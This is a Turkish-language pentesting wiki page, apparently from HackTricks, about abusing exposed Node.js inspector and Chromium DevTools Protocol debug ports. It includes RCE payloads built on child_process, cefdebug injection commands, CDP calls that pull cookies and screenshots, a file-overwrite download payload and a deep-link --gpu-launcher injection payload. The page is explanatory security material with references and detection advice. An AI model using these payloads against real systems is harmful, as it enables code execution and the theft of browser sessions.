# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Tarihsel pratik örnekler arasında Multimaster walkthrough'u ve CVE-2019-1414 Visual Studio Code debugger saldırısı bulunur; bunları her güncel Electron veya Chromium hedefinin aynı primitive'leri sunduğunu varsaymak yerine sürüme özgü bağlam olarak kullanın.<sup>[[1]](#references)[[3]](#references)</sup>

## Temel Bilgiler

[Belgelerden](https://nodejs.org/learn/getting-started/debugging): `--inspect` switch'i ile başlatıldığında bir Node.js process'i bir debugging client'ını dinler. **Varsayılan olarak**, host ve port **`127.0.0.1:9229`** üzerinde dinleme yapar. Her process'e ayrıca **benzersiz** bir **UUID** atanır.<sup>[[4]](#references)</sup>

Inspector client'ları bağlanmak için host adresini, portu ve UUID'yi bilmeli ve belirtmelidir. Tam URL şu şekilde görünür: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> **Debugger, Node.js execution environment'a tam erişime sahip olduğundan**, bu porta bağlanabilen kötü amaçlı bir actor, Node.js process'i adına rastgele code execute edebilir (**potansiyel privilege escalation**).<sup>[[4]](#references)</sup>

Bir inspector'ı başlatmanın birkaç yolu vardır:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
İncelenen bir işlemi başlattığınızda buna benzer bir şey görünür:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) tabanlı process'ler, `--remote-debugging-port=9222` ile bir debugger açığa çıkarabilir. Bu, bir Node.js inspector yerine [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden browser'ı açığa çıkarır; bu nedenle Node.js `process` tabanlı payload'lar varsayılan olarak doğrudan uygulanamaz.<sup>[[2]](#references)[[5]](#references)</sup>

Debug modunda bir browser başlattığınızda buna benzer bir şey görünür:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Bir CDP endpoint'ini numaralandırma ve yönetme

HTTP discovery endpoint'leri **browser** WebSocket'i ile bağımsız **target** (tab, worker, extension vb.) WebSocket'lerini birbirinden ayırır. Browser endpoint'i için `/json/version`, target'lar için `/json/list` sorgulanır; döndürülen `webSocketDebuggerUrl` değerleri, CDP'nin JSON-RPC benzeri mesajlarıyla doğrudan yönetilebilir.<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
Örneğin, `websocat "$BROWSER_WS"` ile bağlanıp `{"id":1,"method":"Target.getTargets"}` veya `{"id":2,"method":"Storage.getCookies"}` gönderin. Bir page target üzerinde (`websocat "$PAGE_WS"`), `Runtime.evaluate` ilgili renderer içinde çalışır ve `Page.captureScreenshot` base64-encoded bir ekran görüntüsü döndürür. `document.cookie`, `HttpOnly` cookie'lerini açığa çıkaramaz; `Storage.getCookies` ise browser'dan cookie store'unu ister.<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### Tarayıcılar, WebSockets ve same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Web-browser'da açılan web siteleri, browser security model kapsamında WebSocket ve HTTP requests gerçekleştirebilir. **Benzersiz bir debugger session id elde etmek** için bir **initial HTTP connection** gereklidir. **same-origin-policy**, web sitelerinin **bu HTTP connection**'ı gerçekleştirmesini **engeller**. [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**'lerine** karşı ek security sağlamak için Node.js, connection için **'Host' headers** değerlerinin ya bir **IP address** ya da tam olarak **`localhost`** belirttiğini doğrular.<sup>[[4]](#references)</sup>

> [!TIP]
> Bu **security measure, inspector'ı** yalnızca **bir HTTP request göndererek** (SSRF vuln exploit edilerek yapılabilir) code çalıştırmak için exploit etmeyi **engeller**.<sup>[[4]](#references)</sup>

### Çalışan process'lerde inspector'ı başlatma

Çalışan bir nodejs process'ine **SIGUSR1 signal'i** göndererek process'in **inspector'ı** default port'ta **başlatmasını** sağlayabilirsiniz. Ancak yeterli privileges'a sahip olmanız gerektiğini unutmayın; bu işlem size process içindeki bilgilere **privileged access** sağlayabilir, ancak doğrudan bir privilege escalation sağlamaz.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Bu, container'larda kullanışlıdır çünkü **process'i kapatıp `--inspect` ile yeni bir process başlatmak** bir seçenek **değildir**; process ile birlikte **container** da **sonlandırılır**.<sup>[[6]](#references)</sup>

### Inspector/debugger'a bağlanma

**Chromium tabanlı bir browser'a** bağlanmak için Chrome veya Edge'de sırasıyla `chrome://inspect` veya `edge://inspect` URL'lerine erişilebilir. Configure düğmesine tıklayarak **hedef host ve portun** doğru şekilde listelendiğinden emin olunmalıdır. Görselde bir Remote Code Execution (RCE) örneği gösterilmektedir:<sup>[[2]](#references)[[4]](#references)</sup>

![Debugger'a erişmek için bir URL görünecektir. örn. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Inspector/debugger'a bağlanma: **Chromium tabanlı bir browser'a** bağlanmak için ...](<../../images/image (674).png>)

**Command line** kullanarak bir debugger/inspector'a şu şekilde bağlanabilirsiniz:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) aracı, yerel olarak çalışan **inspectors**'ları **bulmaya** ve bunlara **code enjekte etmeye** olanak tanır.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> **Chrome DevTools Protocol** üzerinden bir tarayıcıya bağlanıldığında **NodeJS RCE exploit'lerinin çalışmayacağını** unutmayın (ilginç işlemler yapmak için API'yi kontrol etmeniz gerekir).<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector'da RCE

> [!TIP]
> Buraya Electron'da bir XSS'ten [**RCE elde etmenin yolunu arayarak geldiyseniz bu sayfayı kontrol edin.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Bir Node **inspector**'ına **bağlanabildiğinizde** **RCE** elde etmenin yaygın yollarından biri, buna benzer bir şey kullanmaktır (**Chrome DevTools protocol** bağlantısında bunun çalışmayacağı görülüyor):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payload'ları

API'yi buradan kontrol edebilirsiniz: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Bu bölümde, insanların bu protocol'ü exploit etmek için kullandığını gördüğüm ilginç şeyleri listeleyeceğim.

### Chrome 136+ varsayılan profil kısıtlaması

**Chrome 136** ile birlikte Chrome, **varsayılan Chrome veri dizinini** hedeflediklerinde `--remote-debugging-port` ve `--remote-debugging-pipe` seçeneklerini yok sayar. Bu switch, standart olmayan bir `--user-data-dir` ile birlikte kullanılmalıdır; bu dizinin ayrı encryption key'i ve izole browser state'i, basit flag tabanlı tekniğin kullanıcının normal authenticated profilini açığa çıkarmasını engeller. Bu Chrome'a özgü kısıtlamanın, doğrulama yapılmadan eski Chrome sürümlerini, Chrome for Testing'i, Electron/CEF uygulamalarını veya diğer Chromium türevlerini kapsadığı varsayılmamalıdır.<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
Bu nedenle, yalnızca `--remote-debugging-port` ile başlatılmış güncel bir Chrome process görmek, CDP'nin etkinleştiğini **kanıtlamaz**. Listener'ı ve `/json/version` endpoint'ini doğrulayın ve hangi profile'ın bunu gerçekten desteklediğini belirleyin.<sup>[[14]](#references)</sup>

### Deep Link'ler Üzerinden Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) kapsamında Rhino security, CEF tabanlı bir uygulamanın sistemde, tam URI'yi alan ve ardından CEF tabanlı application'ı bu URI'den kısmen oluşturulan bir configuration ile **başlatan** özel bir **URI** (workspaces://index.html) **kaydettiğini** keşfetti.<sup>[[8]](#references)</sup>

URI parameter'larının URL decoded edildiği ve CEF tabanlı application'ı başlatmak için kullanıldığı keşfedildi. Bu durum, bir kullanıcının **`--gpu-launcher`** flag'ini **command line** içine **inject etmesine** ve arbitrary şeyler execute etmesine olanak sağlıyordu.<sup>[[8]](#references)</sup>

Dolayısıyla aşağıdaki gibi bir payload:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exe çalıştıracaktır.<sup>[[8]](#references)</sup>

### Dosyaların Üzerine Yazma

**indirilen dosyaların kaydedileceği** klasörü değiştirin ve uygulamanın sık kullanılan **source code** dosyasının üzerine **kötü amaçlı kodunuzla** yazmak için bir dosya indirin.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE ve exfiltration

STAR Labs, exposed WebDriver/CDP services' arbitrary file reads ve RCE sağlayabildiğini; bazı yapılandırmalarda DNS rebinding'in exploit chain'i tamamlayabildiğini gösterdi.<sup>[[9]](#references)</sup>

Geçmiş browser-automation ve Chromium security vakaları için Counter WebDriver write-up'ına ve Project Zero issue'ları 773, 1742 ve 1944'e bakın.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Canlı bir Chromium process'i içinde CDP'yi etkinleştirme

Windows'ta [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler), command-line restriction'ın CDP'yi etkinleştirmenin tek yolu olmadığını gösterdi: mevcut bir `msedge.exe` process'ine inject edebilen code, Chromium'un export edilmemiş `content::DevToolsAgentHost::StartRemoteDebuggingServer` fonksiyonunu çağırabilir ve browser'ı yeniden başlatmadan authenticated live profile'ı açığa çıkarabilir.<sup>[[15]](#references)</sup>

Gösterilen chain, `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` ile bir DLL inject eder, internal Edge symbol'larını (önce PDB'lerden, ardından version-specific byte signature'larıyla) çözer, browser window'u subclass eder ve final server-start çağrısının browser **UI thread** üzerinde çalışması için bir message gönderir. Socket loopback'e bind edildikten sonra normal CDP primitive'leri cookie'leri alabilir, tab'leri capture edebilir, network traffic'i inceleyebilir veya authenticated page'lerde JavaScript evaluate edebilir.<sup>[[15]](#references)</sup>

> [!WARNING]
> Bu, **post-compromise/process-injection** tekniğidir; unauthenticated network bypass değildir. İlgili C++ symbol'ları export edilmediği ve signature'lar browser update'lerinden sonra değişebildiği için build'e büyük ölçüde bağlıdır.<sup>[[15]](#references)</sup>

Detection için yalnızca `--remote-debugging-*` command-line telemetry'sine güvenmeyin: browser process'lerine yönelik olağandışı handle'ları ve memory operation'larını (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread creation), DLL injection'ı ve Chrome/Edge'e ait beklenmeyen loopback listening socket'lerini de correlate edin.<sup>[[15]](#references)</sup>

### Post-Exploitation

Gerçek bir ortamda ve Chromium tabanlı bir browser kullanan bir user PC'sini **compromise ettikten sonra**, geçmişte kullanılan bir technique, browser'ı debugging etkin şekilde yeniden başlatmak ve loopback port'unu forward etmekti. Bu, selected profile'ı hâlâ kabul eden product/build'lerde victim'ın browsing state'ini açığa çıkarabilir; ancak Chrome 136+ bunu default data directory'ye karşı uygulamaz.<sup>[[7]](#references)[[14]](#references)</sup>

Orijinal relaunch command, older/version-specific target'lar için aşağıda korunmuştur. İkinci command, desteklenen güncel Chrome formudur; ancak victim'ın normal authenticated state'ini yeniden açmak yerine isolated bir profile oluşturur.<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
macOS'a özgü Chromium relaunch, extension ve CDP tradecraft'i için [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md) sayfasına bakın.



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inceleme ve exploitation aracı](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger üzerinden Visual Studio Code Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Başlarken](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome'un Debugging özelliğini kötüye kullanarak Browsing Session'larını uzaktan gözlemleme ve kontrol etme](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Benimle mi Konuşuyorsun? - DNS Rebinding ve CDP üzerinden WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot'tan RCE'ye](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Güvenliği iyileştirmek için remote debugging switch'lerinde yapılan değişiklikler - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Çalışan bir Edge Browser'a CDP Enjekte Etme: Runtime Browser Instrumentation'a Derinlemesine Bakış](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
